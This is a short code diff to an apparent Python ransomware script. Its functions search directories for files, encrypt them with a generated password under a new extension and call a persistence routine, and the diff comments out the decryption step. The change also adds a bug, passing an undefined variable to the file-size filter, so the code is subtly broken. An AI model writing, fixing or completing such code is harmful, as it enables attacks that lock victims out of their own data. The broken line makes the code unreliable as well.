@@ -23,12 +23,13 @@ def find_files(mode="E"):
                         continue
                     allFiles.append(os.path.join(root, names))
                 if mode == "D":
-                    if names.split(".")[-1].lower() != filext.lower():
+                    if names.split(".")[-1].lower() != filext.replace(".", "").lower():
                         continue
                     allFiles.append(os.path.join(root, names))
     return allFiles
 
 def encryptFiles(files, password):
+    files = filter_file_size(file)
     for file in files:
         try:
             encryptFile(file, file+filext, password, 64 * 1024)
@@ -64,10 +65,10 @@ def genpass():
 def start(mode="E"):
     persistence()
     files_t = find_files(mode)
-    files_t = filter_file_size(files_t)
     password = genpass()
     encryptFiles(files_t, password)
+    #decryptFiles(files_t, password)
 
 
 if __name__ == "__main__":
-    start()
+    start(mode="E")
